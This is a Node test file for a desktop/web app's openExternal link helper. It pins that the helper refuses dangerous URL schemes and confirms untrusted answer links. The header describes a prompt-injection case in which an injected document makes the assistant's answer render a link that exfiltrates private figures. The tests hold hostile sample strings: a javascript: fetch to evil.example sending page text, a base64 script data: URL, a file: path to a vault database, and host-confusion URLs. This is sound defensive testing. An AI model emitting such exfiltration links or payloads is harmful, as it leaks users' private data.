/**
 * §33 §2: external links actually open — ONE seam, every call site. In the
 * Tauri shell the webview's window.open is not a reliable escape (on iOS it
 * silently does nothing), so src/lib/openExternal.ts routes through
 * tauri-plugin-opener's open_url command; plain web keeps window.open. These
 * pins hold the seam closed: no bare window.open outside the helper (and
 * reportExport's blank print shell — a document the app composes, not an
 * external URL), every migrated surface imports the helper, the capability
 * grants the command, and the always-works clipboard handoff exists.
 *
 * The seam is also the ONLY place that can REFUSE a destination, and the
 * second half of this file pins what it must refuse. ChatPanel forwards any
 * answer href that is not `#lh-cite-n` straight here, and ANSWER_HTML_SCHEMA
 * leaves `a[href]` navigable — so a prompt-injected document can render an
 * ordinary-looking link whose query string carries figures from OTHER files in
 * the same context, including ones marked "Private — this device only" (that
 * mark governs only what reaches a cloud provider). The zero-click `<img src>`
 * variant of this threat was already closed (answerHtml.ts:12-17); the
 * one-click anchor variant is the gap. The offline export path emits zero
 * href at all — the live path must not be laxer than the export path.
 *
 * Run: npm test   (or: node --test test/openExternal.test.mjs)
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { register, registerHooks } from "node:module";
import { readFileSync, readdirSync, statSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

register("./_ts-extensionless-hook.mjs", import.meta.url);

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const read = (p) => readFileSync(path.join(ROOT, p), "utf8");

/** Every .ts/.tsx under src/, recursively. */
function sourceFiles(dir = path.join(ROOT, "src")) {
  const out = [];
  for (const name of readdirSync(dir)) {
    const full = path.join(dir, name);
    if (statSync(full).isDirectory()) out.push(...sourceFiles(full));
    else if (/\.(ts|tsx)$/.test(name)) out.push(full);
  }
  return out;
}

test("no bare window.open outside the seam (+ the documented print-shell exemption)", () => {
  const allowed = new Set([
    path.join(ROOT, "src/lib/openExternal.ts"), // the seam's own web fallback
    path.join(ROOT, "src/lib/reportExport.ts"), // blank print shell (not an external URL)
  ]);
  for (const file of sourceFiles()) {
    if (allowed.has(file)) continue;
    const src = readFileSync(file, "utf8");
    assert.ok(
      !src.includes("window.open("),
      `${path.relative(ROOT, file)} must route through src/lib/openExternal.ts`,
    );
  }
  // The exemption is exactly the blank shell, nothing sneakier.
  assert.match(read("src/lib/reportExport.ts"), /window\.open\("", "_blank"/);
});

test("the seam: plugin route in-shell, window.open on plain web", () => {
  const seam = read("src/lib/openExternal.ts");
  assert.match(seam, /if \(isDesktopShell\(\)\) \{/, "shell detection gates the route");
  assert.match(
    seam,
    /core\.invoke\("plugin:opener\|open_url", \{ url \}\)/,
    "the shell path is tauri-plugin-opener's open_url",
  );
  assert.match(
    seam,
    /import\("@tauri-apps\/api\/core"\)/,
    "lazy import — plain web never pulls the Tauri API through this seam",
  );
  assert.match(seam, /window\.open\(url, "_blank", "noopener,noreferrer"\)/);
});

test("the capability set grants the opener command (registered in lib.rs)", () => {
  const caps = read("native/crates/lighthouse-desktop/capabilities/default.json");
  assert.match(caps, /"opener:allow-open-url"/, "open_url explicitly granted");
  const shell = read("native/crates/lighthouse-desktop/src/lib.rs");
  assert.match(shell, /tauri_plugin_opener::init\(\)/, "plugin registered");
});

test("every external-open surface rides the seam", () => {
  for (const file of [
    "src/features/feedback/BugReport.tsx",
    "src/features/settings/SettingsMenu.tsx",
    "src/features/settings/SettingsPage.tsx",
    "src/features/chat/ChatPanel.tsx",
  ]) {
    assert.match(
      read(file),
      /import \{ openExternal \} from "@\/lib\/openExternal";/,
      `${file} imports the seam`,
    );
  }
  // Answer links: in-shell clicks preventDefault into the seam; plain web
  // keeps the ordinary target=_blank anchor.
  const chat = read("src/features/chat/ChatPanel.tsx");
  assert.match(chat, /if \(href && isDesktopShell\(\)\) \{\s*\n\s*e\.preventDefault\(\);\s*\n\s*openExternal\(href\);/);
});

test("the always-works clipboard handoff: full body + both destinations", async () => {
  const { buildFeedbackClipboard, FEEDBACK_EMAIL, FEEDBACK_ISSUES_URL } = await import(
    "../src/lib/feedbackLinks.ts"
  );
  const out = buildFeedbackClipboard({ kind: "idea", what: "More charts please", version: "0.14.3", os: "macOS" });
  assert.ok(out.includes("More charts please"), "the composed body rides along");
  assert.ok(out.includes(`Email this to: ${FEEDBACK_EMAIL}`), "mail destination named");
  assert.ok(out.includes(`or open an issue: ${FEEDBACK_ISSUES_URL}`), "issue destination named");
  // No URL caps on the clipboard: a long log is carried in full.
  const long = buildFeedbackClipboard({ what: "x", log: "L".repeat(5000) });
  assert.ok(long.includes("L".repeat(5000)), "clipboard body is uncapped");
  // The dialog wires it to the tertiary button.
  const bug = read("src/features/feedback/BugReport.tsx");
  assert.match(bug, /buildFeedbackClipboard\(report\)/);
  assert.match(bug, /\{copied \? "Copied" : "Copy feedback"\}/);
});

/* ------------------------------------------------------------------ *
 * What the seam must REFUSE — driven through the real module.
 *
 * The seam's two collaborators are stubbed at the module-resolution layer
 * (node:module registerHooks) rather than mocked inside the test, so the code
 * under test is the shipped src/lib/openExternal.ts, unmodified: the stub for
 * `@/shell/desktopBridge` lets a case pick the shell or the plain-web branch,
 * and the stub for `@tauri-apps/api/core` records what would have been handed
 * to the OS. Every URL landing in `osHandoffs` is a URL the OS opened.
 * ------------------------------------------------------------------ */

const STUB_SOURCES = new Map([
  [
    "@/shell/desktopBridge",
    `export function isDesktopShell() { return globalThis.__lhShell === true; }`,
  ],
  [
    "@tauri-apps/api/core",
    `export function invoke(cmd, args) {
       if (globalThis.__lhPluginRejects) return Promise.reject(new Error("no opener plugin"));
       globalThis.__lhOsHandoffs.push({ via: cmd, url: args?.url });
       return Promise.resolve();
     }`,
  ],
]);

registerHooks({
  resolve(specifier, context, nextResolve) {
    if (STUB_SOURCES.has(specifier)) {
      return { url: `lh-test-stub:${specifier}`, shortCircuit: true };
    }
    return nextResolve(specifier, context);
  },
  load(url, context, nextLoad) {
    if (url.startsWith("lh-test-stub:")) {
      return {
        format: "module",
        source: STUB_SOURCES.get(url.slice("lh-test-stub:".length)),
        shortCircuit: true,
      };
    }
    return nextLoad(url, context);
  },
});

globalThis.__lhOsHandoffs = [];
globalThis.window = {
  open(url) {
    globalThis.__lhOsHandoffs.push({ via: "window.open", url });
    return null;
  },
};

const { openExternal } = await import("../src/lib/openExternal.ts");

/**
 * Call the seam the way a caller does and report every URL that reached the
 * OS. `shell` picks the branch; `pluginRejects` exercises the shell branch's
 * documented fallback into window.open; `origin` is the provenance the call
 * site vouches for — omitting it is exactly what a forgetful call site does.
 */
async function handoffsFor(url, { shell, pluginRejects = false, origin } = {}) {
  globalThis.__lhShell = shell;
  globalThis.__lhPluginRejects = pluginRejects;
  globalThis.__lhOsHandoffs = [];
  openExternal(url, origin);
  // The shell branch is a promise chain (lazy import → invoke → .catch);
  // drain the microtask queue plus a macrotask so the handoff has landed.
  await new Promise((resolve) => setTimeout(resolve, 25));
  return globalThis.__lhOsHandoffs;
}

/** Schemes the seam exists to serve (openExternal.ts:4-5): https and mailto. */
const REFUSED = [
  ["javascript:", "javascript:fetch('https://evil.example/c?d='+document.body.innerText)"],
  ["data:", "data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9ldmlsJyk8L3NjcmlwdD4="],
  ["file:", "file:///Users/me/Library/Application%20Support/lighthouse/vault.db"],
  ["vbscript:", "vbscript:msgbox(1)"],
  ["blob:", "blob:https://evil.example/9f3c-4a1e"],
  ["unparseable", "not a url at all"],
  ["scheme-relative (host is not what it looks like)", "//evil.example/collect"],
];

test("the seam refuses every scheme it does not serve — shell branch", async () => {
  for (const [label, url] of REFUSED) {
    assert.deepEqual(
      await handoffsFor(url, { shell: true }),
      [],
      `${label} was handed to the OS: the seam validates nothing before invoking plugin:opener|open_url`,
    );
    // The allowlist is unconditional, not just the untrusted gate: an
    // app-authored call site cannot open these schemes either.
    assert.deepEqual(
      await handoffsFor(url, { shell: true, origin: "app" }),
      [],
      `${label} was handed to the OS for an app-authored call site`,
    );
  }
});

test("the seam refuses every scheme it does not serve — plain-web branch", async () => {
  for (const [label, url] of REFUSED) {
    assert.deepEqual(
      await handoffsFor(url, { shell: false }),
      [],
      `${label} was handed to the OS through the plain-web window.open branch`,
    );
  }
});

test("the shell branch's window.open fallback is not a way around the refusal", async () => {
  // When the opener plugin is unavailable the seam falls back to window.open
  // (openExternal.ts:26-30). A refusal decided before the transport is chosen
  // holds on both routes; one decided at the invoke site leaks here.
  for (const [label, url] of REFUSED) {
    assert.deepEqual(
      await handoffsFor(url, { shell: true, pluginRejects: true }),
      [],
      `${label} escaped through the shell branch's window.open fallback`,
    );
  }
});

test("an answer-origin destination does not reach the OS unannounced", async () => {
  // The exfil shape: a plausible-looking link a prompt-injected document can
  // render, whose query string carries figures pulled from OTHER files in the
  // same context. It parses, it is https, and the sanitizer passes it — so no
  // upstream wall stops it. Only the seam can, and only if it knows the href
  // came from an answer rather than from the app.
  //
  // Pinned fail-closed (docs/CONVENTIONS.md): a caller that says nothing about
  // provenance gets the UNTRUSTED treatment, so a destination reaches the OS
  // only when a call site has explicitly vouched for it (the finding's
  // "pass provenance as an argument (never by sniffing the URL)"). If the fix
  // instead makes app-authored the default and marks answer hrefs explicitly,
  // this case must move to the marked call shape — the property being pinned
  // is "an answer href is not opened silently", not the argument's spelling.
  const exfil =
    "https://evil.example/collect?q=" +
    encodeURIComponent("Q3 revenue 4.2M; runway 11mo; acquirer Northwind; src=board-deck.pdf");

  assert.deepEqual(
    await handoffsFor(exfil, { shell: true }),
    [],
    "an unvouched answer href was opened with no scheme check, no host shown, and no confirmation",
  );
  assert.deepEqual(
    await handoffsFor(exfil, { shell: false }),
    [],
    "an unvouched answer href was opened by the plain-web branch",
  );
});

test("an untrusted destination opens only after a prompt that NAMES the host", async () => {
  // The refusal must be a CONFIRMATION, not a blanket block: the user is shown
  // the host and decides. Agreeing opens the URL unmodified; declining does not.
  const exfil = "https://evil.example/collect?q=Q3%20revenue%204.2M";
  const asked = [];
  globalThis.window.confirm = (message) => {
    asked.push(message);
    return true;
  };
  try {
    const handoffs = await handoffsFor(exfil, { shell: true });
    assert.equal(asked.length, 1, "the user was not asked");
    assert.ok(asked[0].includes("evil.example"), `the prompt did not name the host: ${asked[0]}`);
    assert.deepEqual(
      handoffs.map((h) => h.url),
      [exfil],
      "an agreed-to link must still open, unmodified",
    );
    // The OS gets the string the seam validated. A raw
    // `https://github.com\@evil.example/` is host github.com to `new URL`
    // and host evil.example to every RFC-3986 authority split — normalize,
    // or the prompt names one host and the browser opens another.
    const split = "https://github.com\\@evil.example/";
    const [handed] = await handoffsFor(split, { shell: true });
    assert.equal(
      handed.url,
      "https://github.com/@evil.example/",
      "the OS got the raw string, not the parsed one — host shown != host opened",
    );
    globalThis.window.confirm = () => false;
    assert.deepEqual(
      await handoffsFor(exfil, { shell: true }),
      [],
      "declining the prompt still opened the link",
    );
  } finally {
    // Back to the default environment: no confirm available anywhere else.
    delete globalThis.window.confirm;
  }
});

test("the schemes the seam does serve still reach the OS", async () => {
  // Counter-pin, so a refusal cannot be satisfied by refusing everything: the
  // app's own destinations (openExternal.ts:4-5 — https in the browser, mailto
  // in the mail client) must still open. These are vouched-for call sites, so
  // they pass the provenance the fix introduced: origin "app".
  for (const url of [
    "https://github.com/lmansf/lighthouse/issues/new?title=Feedback",
    "mailto:lmansf96@gmail.com?subject=Feedback",
  ]) {
    const shellHandoffs = await handoffsFor(url, { shell: true, origin: "app" });
    assert.deepEqual(
      shellHandoffs.map((h) => h.url),
      [url],
      `${url} must still open in the shell, unmodified`,
    );
    const webHandoffs = await handoffsFor(url, { shell: false, origin: "app" });
    assert.deepEqual(
      webHandoffs.map((h) => h.url),
      [url],
      `${url} must still open on plain web, unmodified`,
    );
  }
});
